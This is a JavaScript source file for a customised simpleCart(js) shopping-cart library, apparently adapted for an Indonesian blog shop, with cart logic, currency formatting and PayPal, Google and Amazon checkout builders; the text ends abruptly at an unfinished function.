(function(s, u) {
    var v = "string",
        q = function(a, b) {
            return typeof a === b
        },
        t = function(a) {
            return q(a, "undefined")
        },
        f = function(a) {
            return q(a, "function")
        },
        k = function(a) {
            return "object" === typeof HTMLElement ? a instanceof HTMLElement : "object" === typeof a && 1 === a.nodeType && "string" === typeof a.nodeName
        },
        r = function(i) {
            function z(w) {
                return x.extend({
                    attr: "",
                    label: "",
                    view: "attr",
                    text: "",
                    className: "",
                    hide: !1
                }, w || {})
            }

            function D() {
                if (!x.isReady) {
                    try {
                        u.documentElement.doScroll("left")
                    } catch (w) {
                        setTimeout(D, 1);
                        return
                    }
                    x.init()
                }
            }
            var A = {
                    MooTools: "$$",
                    Prototype: "$$",
                    jQuery: "*"
                },
                b = 0,
                j = {},
                a = i || "simpleCart",
                B = {};
            i = {};
            i = {};
            var F = s.localStorage,
                E = s.console || {
                    msgs: [],
                    log: function(w) {
                        E.msgs.push(w)
                    }
                },
                l = {
                    IDR: {
                        code: "IDR",
                        symbol: "Rp",
                        name: "Indonesian rupiah",
                        delimiter: ",",
                        decimal: ".",
                        after: false,
                        accuracy: 3
                    },
                    USD: {
                        code: "USD",
                        symbol: "&#36;",
                        name: "US Dollar"
                    },
                    QAR: {
                        code: "QAR",
                        symbol: "QAR;",
                        name: "Qatar"
                    },
                    AUD: {
                        code: "AUD",
                        symbol: "&#36;",
                        name: "Australian Dollar"
                    },
                    BRL: {
                        code: "BRL",
                        symbol: "R&#36;",
                        name: "Brazilian Real"
                    },
                    CAD: {
                        code: "CAD",
                        symbol: "&#36;",
                        name: "Canadian Dollar"
                    },
                    CZK: {
                        code: "CZK",
                        symbol: "&nbsp;&#75;&#269;",
                        name: "Czech Koruna",
                        after: !0
                    },
                    DKK: {
                        code: "DKK",
                        symbol: "DKK&nbsp;",
                        name: "Danish Krone"
                    },
                    EUR: {
                        code: "EUR",
                        symbol: "&euro;",
                        name: "Euro"
                    },
                    HKD: {
                        code: "HKD",
                        symbol: "&#36;",
                        name: "Hong Kong Dollar"
                    },
                    HUF: {
                        code: "HUF",
                        symbol: "&#70;&#116;",
                        name: "Hungarian Forint"
                    },
                    ILS: {
                        code: "ILS",
                        symbol: "&#8362;",
                        name: "Israeli New Sheqel"
                    },
                    JPY: {
                        code: "JPY",
                        symbol: "&yen;",
                        name: "Japanese Yen",
                        accuracy: 0
                    },
                    MXN: {
                        code: "MXN",
                        symbol: "&#36;",
                        name: "Mexican Peso"
                    },
                    NOK: {
                        code: "NOK",
                        symbol: "NOK&nbsp;",
                        name: "Norwegian Krone"
                    },
                    NZD: {
                        code: "NZD",
                        symbol: "&#36;",
                        name: "New Zealand Dollar"
                    },
                    PLN: {
                        code: "PLN",
                        symbol: "PLN&nbsp;",
                        name: "Polish Zloty"
                    },
                    GBP: {
                        code: "GBP",
                        symbol: "&pound;",
                        name: "Pound Sterling"
                    },
                    SGD: {
                        code: "SGD",
                        symbol: "&#36;",
                        name: "Singapore Dollar"
                    },
                    SEK: {
                        code: "SEK",
                        symbol: "SEK&nbsp;",
                        name: "Swedish Krona"
                    },
                    CHF: {
                        code: "CHF",
                        symbol: "CHF&nbsp;",
                        name: "Swiss Franc"
                    },
                    THB: {
                        code: "THB",
                        symbol: "&#3647;",
                        name: "Thai Baht"
                    },
                    BTC: {
                        code: "BTC",
                        symbol: " BTC",
                        name: "Bitcoin",
                        accuracy: 4,
                        after: !0
                    }
                },
                K = {
                    checkout: {
                        type: "PayPal",
                        email: "paypalMail"
                    },
                    currency: "currencyOption",
                    language: "languagePage",
                    cartStyle: "div",
                    cartColumns: [{
                        attr: "name",
                        label: "Nama Barang"
                    }, {
                        attr: "price",
                        label: "Harga",
                        view: "currency"
                    }, {
                        view: "decrement",
                        label: !1
                    }, {
                        attr: "quantity",
                        label: "Qty"
                    }, {
                        view: "increment",
                        label: !1
                    }, {
                        attr: "total",
                        label: "Harga Total",
                        view: "currency"
                    }, {
                        view: "remove",
                        text: "Remove",
                        label: !1
                    }],
                    excludeFromCheckout: ["thumb"],
                    shippingFlatRate: 0,
                    shippingQuantityRate: 0,
                    shippingTotalRate: 0,
                    shippingCustom: null,
                    taxRate: 0,
                    taxShipping: !1,
                    data: {}
                },
                x = function(w) {
                    if (f(w)) {
                        return x.ready(w)
                    }
                    if (q(w, "object")) {
                        return x.extend(K, w)
                    }
                },
                c, g;
            x.extend = function(w, C) {
                var y;
                t(C) && (C = w, w = x);
                for (y in C) {
                    Object.prototype.hasOwnProperty.call(C, y) && (w[y] = C[y])
                }
                return w
            };
            x.extend({
                copy: function(w) {
                    w = r(w);
                    w.init();
                    return w
                }
            });
            x.extend({
                isReady: !1,
                add: function(w, C) {
                    var y = new x.Item(w || {}),
                        G = !0,
                        H = !0 === C ? C : !1;
                    if (!H && (G = x.trigger("beforeAdd", [y]), !1 === G)) {
                        return !1
                    }(G = x.has(y)) ? (G.increment(y.quantity()), y = G) : j[y.id()] = y;
                    x.update();
                    H || x.trigger("afterAdd", [y, t(G)]);
                    return y
                },
                each: function(J, C) {
                    var y, H = 0,
                        I, G, w;
                    if (f(J)) {
                        G = J, w = j
                    } else {
                        if (f(C)) {
                            G = C, w = J
                        } else {
                            return
                        }
                    }
                    for (y in w) {
                        if (Object.prototype.hasOwnProperty.call(w, y)) {
                            I = G.call(x, w[y], H, y);
                            if (!1 === I) {
                                break
                            }
                            H += 1
                        }
                    }
                },
                find: function(w) {
                    var y = [];
                    if (q(j[w], "object")) {
                        return j[w]
                    }
                    if (q(w, "object")) {
                        return x.each(function(C) {
                            var G = !0;
                            x.each(w, function(I, J, H) {
                                q(I, v) ? I.match(/<=.*/) ? (I = parseFloat(I.replace("<=", "")), C.get(H) && parseFloat(C.get(H)) <= I || (G = !1)) : I.match(/</) ? (I = parseFloat(I.replace("<", "")), C.get(H) && parseFloat(C.get(H)) < I || (G = !1)) : I.match(/>=/) ? (I = parseFloat(I.replace(">=", "")), C.get(H) && parseFloat(C.get(H)) >= I || (G = !1)) : I.match(/>/) ? (I = parseFloat(I.replace(">", "")), C.get(H) && parseFloat(C.get(H)) > I || (G = !1)) : C.get(H) && C.get(H) === I || (G = !1) : C.get(H) && C.get(H) === I || (G = !1);
                                return G
                            });
                            G && y.push(C)
                        }), y
                    }
                    t(w) && x.each(function(C) {
                        y.push(C)
                    });
                    return y
                },
                items: function() {
                    return this.find()
                },
                has: function(w) {
                    var y = !1;
                    x.each(function(C) {
                        C.equals(w) && (y = C)
                    });
                    return y
                },
                empty: function() {
                    var w = {};
                    x.each(function(y) {
                        !1 === y.remove(!0) && (w[y.id()] = y)
                    });
                    j = w;
                    x.update()
                },
                quantity: function() {
                    var w = 0;
                    x.each(function(y) {
                        w += y.quantity()
                    });
                    return w
                },
                total: function() {
                    var w = 0;
                    x.each(function(y) {
                        w += y.total()
                    });
                    return w
                },
                grandTotal: function() {
                    return x.total() + x.tax() + x.shipping()
                },
                update: function() {
                    x.save();
                    x.trigger("update")
                },
                init: function() {
                    x.load();
                    x.update();
                    x.ready()
                },
                $: function(w) {
                    return new x.ELEMENT(w)
                },
                $create: function(w) {
                    return x.$(u.createElement(w))
                },
                setupViewTool: function() {
                    var w, C = s,
                        y;
                    for (y in A) {
                        if (Object.prototype.hasOwnProperty.call(A, y) && s[y] && (w = A[y].replace("*", y).split("."), (w = w.shift()) && (C = C[w]), "function" === typeof C)) {
                            c = C;
                            x.extend(x.ELEMENT._, B[y]);
                            break
                        }
                    }
                },
                ids: function() {
                    var w = [];
                    x.each(function(y) {
                        w.push(y.id())
                    });
                    return w
                },
                save: function() {
                    x.trigger("beforeSave");
                    var w = {};
                    x.each(function(y) {
                        w[y.id()] = x.extend(y.fields(), y.options())
                    });
                    F.setItem(a + "_items", JSON.stringify(w));
                    x.trigger("afterSave")
                },
                load: function() {
                    j = {};
                    var w = F.getItem(a + "_items");
                    if (w) {
                        try {
                            x.each(JSON.parse(w), function(C) {
                                x.add(C, !0)
                            })
                        } catch (y) {
                            x.error("Error Loading data: " + y)
                        }
                        x.trigger("load")
                    }
                },
                ready: function(w) {
                    f(w) ? x.isReady ? w.call(x) : x.bind("ready", w) : t(w) && !x.isReady && (x.trigger("ready"), x.isReady = !0)
                },
                error: function(w) {
                    var C = "";
                    q(w, v) ? C = w : q(w, "object") && q(w.message, v) && (C = w.message);
                    try {
                        E.log("simpleCart(js) Error: " + C)
                    } catch (y) {}
                    x.trigger("error", w)
                }
            });
            x.extend({
                tax: function() {
                    var w = K.taxShipping ? x.total() + x.shipping() : x.total(),
                        y = x.taxRate() * w;
                    x.each(function(C) {
                        C.get("tax") ? y += C.get("tax") : C.get("taxRate") && (y += C.get("taxRate") * C.total())
                    });
                    return parseFloat(y)
                },
                taxRate: function() {
                    return K.taxRate || 0
                },
                shipping: function(w) {
                    if (f(w)) {
                        x({
                            shippingCustom: w
                        })
                    } else {
                        var y = K.shippingQuantityRate * x.quantity() + K.shippingTotalRate * x.total() + K.shippingFlatRate;
                        f(K.shippingCustom) && (y += K.shippingCustom.call(x));
                        x.each(function(C) {
                            y += parseFloat(C.get("shipping") || 0)
                        });
                        return parseFloat(y)
                    }
                }
            });
            g = {
                attr: function(y, w) {
                    return y.get(w.attr) || ""
                },
                currency: function(w, y) {
                    return x.toCurrency(w.get(y.attr) || 0)
                },
                jumlah: function(y, w) {
                    return "<div class='jumlah'><sp>%0A</sp><span>Jumlah :</span>" + y.get(w.attr) + "<sp>%0A</sp></div>"
                },
                link: function(y, w) {
                    return "<a href='" + y.get(w.attr) + "'>" + w.text + "</a><sp>%0A</sp>"
                },
                decrement: function(y, w) {
                    return "<a href='javascript:;' class='" + a + "_decrement'>" + (w.text || "-") + "</a>"
                },
                increment: function(y, w) {
                    return "<a href='javascript:;' class='" + a + "_increment'>" + (w.text || "+") + "</a>"
                },
                name_Ayah: function(y, w) {
                    return "<div class='nama_produk' data-testid='btnTitlepedia'>" + y.get(w.attr) + w.text + "</div>"
                },
                image: function(y, w) {
                    return "<div class='foto_produk' data-testid='btnImagepedia'><img src='" + y.get(w.attr) + "'/></div>"
                },
                input: function(y, w) {
                    return "<input type='text' value='" + y.get(w.attr) + "' class='" + a + "_input'/>"
                },
                remove: function(y, w) {
                    return "<a href='javascript:;' class='" + a + "_remove'>" + (w.text || "") + "</a><sp>%0A-----------------------------------------------------------%0A</sp>"
                }
            };
            x.extend({
                writeCart: function(J) {
                    var M = K.cartStyle.toLowerCase(),
                        L = "" === M,
                        G = L ? "div" : "div",
                        C = L ? "div" : "div",
                        w = L ? "div" : "div",
                        I = x.$create(M),
                        M = x.$create(G).addClass("blogPedia"),
                        y, H;
                    x.$(J).html("").append(I);
                    x.each(function(O, N) {
                        x.createCartRow(O, N, G, w, I)
                    });
                    return I
                },
                createCartRow: function(G, J, I, w, y, C) {
                    J = x.$create(I).addClass("blogPedia_jual").attr("id", "data-item_" + G.id());
                    var L, M, H;
                    y.append(J);
                    y = 0;
                    for (I = K.cartColumns.length; y < I; y += 1) {
                        L = z(K.cartColumns[y]), M = "item-" + (L.attr || (q(L.view, v) ? L.view : L.label || L.text || "cell")) + " " + L.className, H = G, H = (f(L.view) ? L.view : q(L.view, v) && f(g[L.view]) ? g[L.view] : g.attr).call(x, H, L), M = x.$create(w).addClass(M).html(H), J.append(M)
                    }
                    return J
                }
            });
            x.Item = function(w) {
                function C() {
                    q(y.price, v) && (y.price = parseFloat(y.price.replace(x.currency().decimal, ".").replace(/[^0-9\.]+/ig, "")));
                    isNaN(y.price) && (y.price = 0);
                    0 > y.price && (y.price = 0);
                    q(y.quantity, v) && (y.quantity = parseInt(y.quantity.replace(x.currency().delimiter, ""), 10));
                    isNaN(y.quantity) && (y.quantity = 1);
                    0 >= y.quantity && G.remove()
                }
                var y = {},
                    G = this;
                q(w, "object") && x.extend(y, w);
                b += 1;
                for (y.id = y.id || "postID-" + b; !t(j[y.id]);) {
                    b += 1, y.id = "postID-" + b
                }
                G.get = function(I, J) {
                    var H = !J;
                    return t(I) ? I : f(y[I]) ? y[I].call(G) : t(y[I]) ? f(G[I]) && H ? G[I].call(G) : !t(G[I]) && H ? G[I] : y[I] : y[I]
                };
                G.set = function(H, I) {
                    t(H) || (y[H.toLowerCase()] = I, "price" !== H.toLowerCase() && "quantity" !== H.toLowerCase() || C());
                    return G
                };
                G.equals = function(H) {
                    for (var I in y) {
                        if (Object.prototype.hasOwnProperty.call(y, I) && "quantity" !== I && "id" !== I && H.get(I) !== y[I]) {
                            return !1
                        }
                    }
                    return !0
                };
                G.options = function() {
                    var H = {};
                    x.each(y, function(M, J, I) {
                        var L = !0;
                        x.each(G.reservedFields(), function(N) {
                            N === I && (L = !1);
                            return L
                        });
                        L && (H[I] = G.get(I))
                    });
                    return H
                };
                C()
            };
            x.Item._ = x.Item.prototype = {
                increment: function(w) {
                    w = parseInt(w || 1, 10);
                    this.quantity(this.quantity() + w);
                    return 1 > this.quantity() ? (this.remove(), null) : this
                },
                decrement: function(w) {
                    return this.increment(-parseInt(w || 1, 10))
                },
                remove: function(w) {
                    if (!1 === x.trigger("beforeRemove", [j[this.id()]])) {
                        return !1
                    }
                    delete j[this.id()];
                    w || x.update();
                    return null
                },
                reservedFields: function() {
                    return "quantity id item_number price name shipping tax taxRate".split(" ")
                },
                fields: function() {
                    var w = {},
                        y = this;
                    x.each(y.reservedFields(), function(C) {
                        y.get(C) && (w[C] = y.get(C))
                    });
                    return w
                },
                quantity: function(w) {
                    return t(w) ? parseInt(this.get("quantity", !0) || 1, 10) : this.set("quantity", w)
                },
                price: function(w) {
                    return t(w) ? parseFloat(this.get("price", !0).toString().replace(x.currency().symbol, "").replace(x.currency().delimiter, "") || 1) : this.set("price", parseFloat(w.toString().replace(x.currency().symbol, "").replace(x.currency().delimiter, "")))
                },
                id: function() {
                    return this.get("id", !1)
                },
                total: function() {
                    return this.quantity() * this.price()
                }
            };
            x.extend({
                checkout: function() {
                    if ("custom" === K.checkout.type.toLowerCase() && f(K.checkout.fn)) {
                        K.checkout.fn.call(x, K.checkout)
                    } else {
                        if (f(x.checkout[K.checkout.type])) {
                            var w = x.checkout[K.checkout.type].call(x, K.checkout);
                            w.data && w.action && w.method && !1 !== x.trigger("beforeCheckout", [w.data]) && x.generateAndSendForm(w)
                        } else {
                            x.error("No Valid Checkout Method Specified")
                        }
                    }
                },
                extendCheckout: function(w) {
                    return x.extend(x.checkout, w)
                },
                generateAndSendForm: function(w) {
                    var y = x.$create("form");
                    y.attr("style", "display:none;");
                    y.attr("action", w.action);
                    y.attr("method", w.method);
                    x.each(w.data, function(H, G, C) {
                        y.append(x.$create("input").attr("type", "hidden").attr("name", C).val(H))
                    });
                    x.$("body").append(y);
                    y.el.submit();
                    y.remove()
                }
            });
            x.extendCheckout({
                PayPal: function(w) {
                    if (!w.email) {
                        return x.error("No email provided for PayPal checkout")
                    }
                    var C = {
                            cmd: "_cart",
                            upload: "1",
                            currency_code: x.currency().code,
                            business: w.email,
                            rm: "GET" === w.method ? "0" : "2",
                            tax_cart: (1 * x.tax()).toFixed(2),
                            handling_cart: (1 * x.shipping()).toFixed(2),
                            charset: "utf-8"
                        },
                        y = w.sandbox ? "https://www.sandbox.paypal.com/cgi-bin/webscr" : "https://www.paypal.com/cgi-bin/webscr",
                        G = "GET" === w.method ? "GET" : "POST";
                    w.success && (C["return"] = w.success);
                    w.cancel && (C.cancel_return = w.cancel);
                    w.notify && (C.notify_url = w.notify);
                    x.each(function(L, N) {
                        var I = N + 1,
                            H = L.options(),
                            M = 0,
                            J;
                        C["item_name_" + I] = L.get("name");
                        C["quantity_" + I] = L.quantity();
                        C["amount_" + I] = (1 * L.price()).toFixed(2);
                        C["item_number_" + I] = L.get("item_number") || I;
                        x.each(H, function(Q, O, P) {
                            10 > O && (J = !0, x.each(K.excludeFromCheckout, function(R) {
                                R === P && (J = !1)
                            }), J && (M += 1, C["on" + O + "_" + I] = P, C["os" + O + "_" + I] = Q))
                        });
                        C["option_index_" + N] = Math.min(10, M)
                    });
                    return {
                        action: y,
                        method: G,
                        data: C
                    }
                },
                GoogleCheckout: function(w) {
                    if (!w.merchantID) {
                        return x.error("No merchant id provided for GoogleCheckout")
                    }
                    if ("USD" !== x.currency().code && "GBP" !== x.currency().code) {
                        return x.error("Google Checkout only accepts USD and GBP")
                    }
                    var C = {
                            ship_method_name_1: "Shipping",
                            ship_method_price_1: x.shipping(),
                            ship_method_currency_1: x.currency().code,
                            _charset_: ""
                        },
                        y = "https://checkout.google.com/api/checkout/v2/checkoutForm/Merchant/" + w.merchantID;
                    w = "GET" === w.method ? "GET" : "POST";
                    x.each(function(J, L) {
                        var G = L + 1,
                            H = [],
                            I;
                        C["item_name_" + G] = J.get("name");
                        C["item_quantity_" + G] = J.quantity();
                        C["item_price_" + G] = J.price();
                        C["item_currency_ " + G] = x.currency().code;
                        C["item_tax_rate" + G] = J.get("taxRate") || x.taxRate();
                        x.each(J.options(), function(M, O, N) {
                            I = !0;
                            x.each(K.excludeFromCheckout, function(P) {
                                P === N && (I = !1)
                            });
                            I && H.push(N + ": " + M)
                        });
                        C["item_description_" + G] = H.join(", ")
                    });
                    return {
                        action: y,
                        method: w,
                        data: C
                    }
                },
                AmazonPayments: function(w) {
                    if (!w.merchant_signature) {
                        return x.error("No merchant signature provided for Amazon Payments")
                    }
                    if (!w.merchant_id) {
                        return x.error("No merchant id provided for Amazon Payments")
                    }
                    if (!w.aws_access_key_id) {
                        return x.error("No AWS access key id provided for Amazon Payments")
                    }
                    var C = {
                            aws_access_key_id: w.aws_access_key_id,
                            merchant_signature: w.merchant_signature,
                            currency_code: x.currency().code,
                            tax_rate: x.taxRate(),
                            weight_unit: w.weight_unit || "lb"
                        },
                        y = "https://payments" + (w.sandbox ? "-sandbox" : "") + ".amazon.com/checkout/" + w.merchant_id,
                        G = "GET" === w.method ? "GET" : "POST";
                    x.each(function(L, J) {
                        var H = J + 1,
                            I = [];
                        C["item_title_" + H] = L.get("name");
                        C["item_quantity_" + H] = L.quantity();
                        C["item_price_" + H] = L.price();
                        C["item_sku_ " + H] = L.get("sku") || L.id();
                        C["item_merchant_id_" + H] = w.merchant_id;
                        L.get("weight") && (C["item_weight_" + H] = L.get("weight"));
                        K.shippingQuantityRate && (C["shipping_method_price_per_unit_rate_" + H] = K.shippingQuantityRate);
                        x.each(L.options(), function(M, O, N) {
                            var P = !0;
                            x.each(K.excludeFromCheckout, function(Q) {
                                Q === N && (P = !1)
                            });
                            P && "weight" !== N && "tax" !== N && I.push(N + ": " + M)
                        });
                        C["item_description_" + H] = I.join(", ")
                    });
                    return {
                        action: y,
                        method: G,
                        data: C
                    }
                },
                SendForm: function(w) {
                    if (!w.url) {
                        return x.error("URL required for SendForm Checkout")
                    }
                    var C = {
                            currency: x.currency().code,
                            shipping: x.shipping(),
                            tax: x.tax(),
                            taxRate: x.taxRate(),
                            itemCount: x.find({}).length
                        },
                        y = w.url,
                        G = "GET" === w.method ? "GET" : "POST";
                    x.each(function(L, I) {
                        var J = I + 1,
                            M = [],
                            H;
                        C["item_name_" + J] = L.get("name");
                        C["item_quantity_" + J] = L.quantity();
                        C["item_price_" + J] = L.price();
                        x.each(L.options(), function(P, O, N) {
                            H = !0;
                            x.each(K.excludeFromCheckout, function(Q) {
                                Q === N && (H = !1)
                            });
                            H && M.push(N + ": " + P)
                        });
                        C["item_options_" + J] = M.join(", ")
                    });
                    w.success && (C["return"] = w.success);
                    w.cancel && (C.cancel_return = w.cancel);
                    w.extra_data && (C = x.extend(C, w.extra_data));
                    return {
                        action: y,
                        method: G,
                        data: C
                    }
                }
            });
            i = {
                bind: function(w, C) {
                    if (!f(C)) {
                        return this
                    }
                    this._events || (this._events = {});
                    var y = w.split(/ +/);
                    x.each(y, function(G) {
                        !0 === this._events[G] ? C.apply(this) : t(this._events[G]) ? this._events[G] = [C] : this._events[G].push(C)
                    });
                    return this
                },
                trigger: function(H, w) {
                    var y = !0,
                        G, C;
                    this._events || (this._events = {});
                    if (!t(this._events[H]) && f(this._events[H][0])) {
                        for (G = 0, C = this._events[H].length; G < C; G += 1) {
                            y = this._events[H][G].apply(this, w || [])
                        }
                    }
                    return !1 === y ? !1 : !0
                }
            };
            i.on = i.bind;
            x.extend(i);
            x.extend(x.Item._, i);
            i = {
                beforeAdd: null,
                afterAdd: null,
                load: null,
                beforeSave: null,
                afterSave: null,
                update: null,
                ready: null,
                checkoutSuccess: null,
                checkoutFail: null,
                beforeCheckout: null,
                beforeRemove: null
            };
            x(i);
            x.each(i, function(w, C, y) {
                x.bind(y, function() {
                    f(K[y]) && K[y].apply(this, arguments)
                })
            });
            x.extend({
                toCurrency: function(w, C) {
                    var y = parseFloat(w),
                        H = C || {},
                        H = x.extend(x.extend({
                            symbol: "$",
                            decimal: ".",
                            delimiter: ",",
                            accuracy: 2,
                            after: !1
                        }, x.currency()), H),
                        G = y.toFixed(H.accuracy).split("."),
                        y = G[1],
                        G = G[0],
                        G = x.chunk(G.reverse(), 3).join(H.delimiter.reverse()).reverse();
                    return (H.after ? "" : H.symbol) + G + (y ? H.decimal + y : "") + (H.after ? H.symbol : "")
                },
                chunk: function(y, w) {
                    "undefined" === typeof w && (w = 2);
                    return y.match(RegExp(".{1," + w + "}", "g")) || []
                }
            });
            String.prototype.reverse = function() {
                return this.split("").reverse().join("")
            };
            x.extend({
                currency: function(w) {
                    if (q(w, v) && !t(l[w])) {
                        K.currency = w
                    } else {
                        if (q(w, "object")) {
                            l[w.code] = w, K.currency = w.code
                        } else {
                            return l[K.currency]
                        }
                    }
                }
            });
            x.extend({
                bindOutlets: function(w) {
                    x.each(w, function(G, y, C) {
                        x.bind("update", function() {
                            x.setOutlet("." + a + "_" + C, G)
                        })
                    })
                },
                setOutlet: function(w, C) {
                    var y = C.call(x, w);
                    q(y, "object") && y.el ? x.$(w).html(" ").append(y) : t(y) || x.$(w).html(y)
                },
                bindInputs: function(w) {
                    x.each(w, function(y) {
                        x.setInput("." + a + "_" + y.selector, y.event, y.callback)
                    })
                },
                setInput: function(w, C, y) {
                    x.$(w).live(C, y)
                }
            });
            x.ELEMENT = function(w) {
                this.create(w);
                this.selector = w || null
            };
            x.extend(B, {
                MooTools: {
                    text: function(w) {
                        return this.attr("text", w)
                    },
                    html: function(w) {
                        return this.attr("html", w)
                    },
                    val: function(w) {
                        return this.attr("value", w)
                    },
                    attr: function(y, w) {
                        if (t(w)) {
                            return this.el[0] && this.el[0].get(y)
                        }
                        this.el.set(y, w);
                        return this
                    },
                    remove: function() {
                        this.el.dispose();
                        return null
                    },
                    addClass: function(w) {
                        this.el.addClass(w);
                        return this
                    },
                    removeClass: function(w) {
                        this.el.removeClass(w);
                        return this
                    },
                    append: function(w) {
                        this.el.adopt(w.el);
                        return this
                    },
                    each: function(w) {
                        f(w) && x.each(this.el, function(G, y, C) {
                            w.call(y, y, G, C)
                        });
                        return this
                    },
                    click: function(w) {
                        f(w) ? this.each(function(y) {
                            y.addEvent("click", function(C) {
                                w.call(y, C)
                            })
                        }) : t(w) && this.el.fireEvent("click");
                        return this
                    },
                    live: function(w, C) {
                        var y = this.selector;
                        f(C) && x.$("body").el.addEvent(w + ":relay(" + y + ")", function(G, H) {
                            C.call(H, G)
                        })
                    },
                    match: function(w) {
                        return this.el.match(w)
                    },
                    parent: function() {
                        return x.$(this.el.getParent())
                    },
                    find: function(w) {
                        return x.$(this.el.getElements(w))
                    },
                    closest: function(w) {
                        return x.$(this.el.getParent(w))
                    },
                    descendants: function() {
                        return this.find("*")
                    },
                    tag: function() {
                        return this.el[0].tagName
                    },
                    submit: function() {
                        this.el[0].submit();
                        return this
                    },
                    create: function(w) {
                        this.el = c(w)
                    }
                },
                Prototype: {
                    text: function(w) {
                        if (t(w)) {
                            return this.el[0].innerHTML
                        }
                        this.each(function(C, y) {
                            $(y).update(w)
                        });
                        return this
                    },
                    html: function(w) {
                        return this.text(w)
                    },
                    val: function(w) {
                        return this.attr("value", w)
                    },
                    attr: function(y, w) {
                        if (t(w)) {
                            return this.el[0].readAttribute(y)
                        }
                        this.each(function(C, G) {
                            $(G).writeAttribute(y, w)
                        });
                        return this
                    },
                    append: function(w) {
                        this.each(function(C, y) {
                            w.el ? w.each(function(G, H) {
                                $(y).appendChild(H)
                            }) : k(w) && $(y).appendChild(w)
                        });
                        return this
                    },
                    remove: function() {
                        this.each(function(y, w) {
                            $(w).remove()
                        });
                        return this
                    },
                    addClass: function(w) {
                        this.each(function(C, y) {
                            $(y).addClassName(w)
                        });
                        return this
                    },
                    removeClass: function(w) {
                        this.each(function(C, y) {
                            $(y).removeClassName(w)
                        });
                        return this
                    },
                    each: function(w) {
                        f(w) && x.each(this.el, function(G, y, C) {
                            w.call(y, y, G, C)
                        });
                        return this
                    },
                    click: function(w) {
                        f(w) ? this.each(function(C, y) {
                            $(y).observe("click", function(G) {
                                w.call(y, G)
                            })
                        }) : t(w) && this.each(function(y, C) {
                            $(C).fire("click")
                        });
                        return this
                    },
                    live: function(C, w) {
                        if (f(w)) {
                            var y = this.selector;
                            u.observe(C, function(H, G) {
                                G === c(H).findElement(y) && w.call(G, H)
                            })
                        }
                    },
                    parent: function() {
                        return x.$(this.el.up())
                    },
                    find: function(w) {
                        return x.$(this.el.getElementsBySelector(w))
                    },
                    closest: function(w) {
                        return x.$(this.el.up(w))
                    },
                    descendants: function() {
                        return x.$(this.el.descendants())
                    },
                    tag: function() {
                        return this.el.tagName
                    },
                    submit: function() {
                        this.el[0].submit()
                    },
                    create: function(w) {
                        q(w, v) ? this.el = c(w) : k(w) && (this.el = [w])
                    }
                },
                jQuery: {
                    passthrough: function(y, w) {
                        if (t(w)) {
                            return this.el[y]()
                        }
                        this.el[y](w);
                        return this
                    },
                    text: function(w) {
                        return this.passthrough("text", w)
                    },
                    html: function(w) {
                        return this.passthrough("html", w)
                    },
                    val: function(w) {
                        return this.passthrough("val", w)
                    },
                    append: function(w) {
                        this.el.append(w.el || w);
                        return this
                    },
                    attr: function(y, w) {
                        if (t(w)) {
                            return this.el.attr(y)
                        }
                        this.el.attr(y, w);
                        return this
                    },
                    remove: function() {
                        this.el.remove();
                        return this
                    },
                    addClass: function(w) {
                        this.el.addClass(w);
                        return this
                    },
                    removeClass: function(w) {
                        this.el.removeClass(w);
                        return this
                    },
                    each: function(w) {
                        return this.passthrough("each", w)
                    },
                    click: function(w) {
                        return this.passthrough("click", w)
                    },
                    live: function(y, w) {
                        c(u).delegate(this.selector, y, w);
                        return this
                    },
                    parent: function() {
                        return x.$(this.el.parent())
                    },
                    find: function(w) {
                        return x.$(this.el.find(w))
                    },
                    closest: function(w) {
                        return x.$(this.el.closest(w))
                    },
                    tag: function() {
                        return this.el[0].tagName
                    },
                    descendants: function() {
                        return x.$(this.el.find("*"))
                    },
                    submit: function() {
                        return this.el.submit()
                    },
                    create: function(w) {
                        this.el = c(w)
                    }
                }
            });
            x.ELEMENT._ = x.ELEMENT.prototype;
            x.ready(x.setupViewTool);
            x.ready(function() {
                x.bindOutlets({
                    total: function() {
                        return x.toCurrency(x.total())
                    },
                    quantity: function() {
                        return x.quantity()
                    },
                    items: function(w) {
                        x.writeCart(w)
                    },
                    tax: function() {
                        return x.toCurrency(x.tax())
                    },
                    taxRate: function() {
                        return x.taxRate().toFixed()
                    },
                    shipping: function() {
                        return x.toCurrency(x.shipping())
                    },
                    grandTotal: function() {
                        return x.toCurrency(x.grandTotal())
                    }
                });
                x.bindInputs([{
                    selector: "checkout",
                    event: "click",
                    callback: function() {
                        x.checkout()
                    }
                }, {
                    selector: "empty",
                    event: "click",
                    callback: function() {
                        x.empty()
                    }
                }, {
                    selector: "increment",
                    event: "click",
                    callback: function() {
                        x.find(x.$(this).closest(".blogPedia_jual").attr("id").split("_")[1]).increment();
                        x.update()
                    }
                }, {
                    selector: "decrement",
                    event: "click",
                    callback: function() {
                        x.find(x.$(this).closest(".blogPedia_jual").attr("id").split("_")[1]).decrement();
                        x.update()
                    }
                }, {
                    selector: "remove",
                    event: "click",
                    callback: function() {
                        x.find(x.$(this).closest(".blogPedia_jual").attr("id").split("_")[1]).remove()
                    }
                }, {
                    selector: "input",
                    event: "change",
                    callback: function() {
                        var w = x.$(this),
                            C = w.parent(),
                            y = C.attr("class").split(" ");
                        x.each(y, function(G) {
                            G.match(/item-.+/i) && (G = G.split("-")[1], x.find(C.closest(".blogPedia_jual").attr("id").split("_")[1]).set(G, w.val()), x.update())
                        })
                    }
                }, {
                    selector: "shelfItem .item_add",
                    event: "click",
                    callback: function() {
                        var w = {};
                        x.$(this).closest("." + a + "_shelfItem").descendants().each(function(C, y) {
                            var G = x.$(y);
                            G.attr("class") && G.attr("class").match(/item_.+/) && !G.attr("class").match(/item_add/) && x.each(G.attr("class").split(" "), function(J) {
                                var H, I;
                                if (J.match(/item_.+/)) {
                                    J = J.split("_")[1];
                                    H = "";
                                    switch (G.tag().toLowerCase()) {
                                        case "input":
                                        case "textarea":
                                        case "select":
                                            I = G.attr("type");
                                            if (!I || ("checkbox" === I.toLowerCase() || "radio" === I.toLowerCase()) && G.attr("checked") || "text" === I.toLowerCase() || "number" === I.toLowerCase()) {
                                                H = G.val()
                                            }
                                            break;
                                        case "img":
                                            H = G.attr("src");
                                            break;
                                        default:
                                            H = G.text()
                                    }
                                    null !== H && "" !== H && (w[J.toLowerCase()] = w[J.toLowerCase()] ? w[J.toLowerCase()] + ", " + H : H)
                                }
                            })
                        });
                        x.add(w)
                    }
                }])
            });
            u.addEventListener ? s.DOMContentLoaded = function() {
                u.removeEventListener("DOMContentLoaded", DOMContentLoaded, !1);
                x.init()
            } : u.attachEvent && (s.DOMContentLoaded = function() {
                "complete" === u.readyState && (u.detachEvent("onreadystatechange", DOMContentLoaded), x.init())
            });
            (function() {
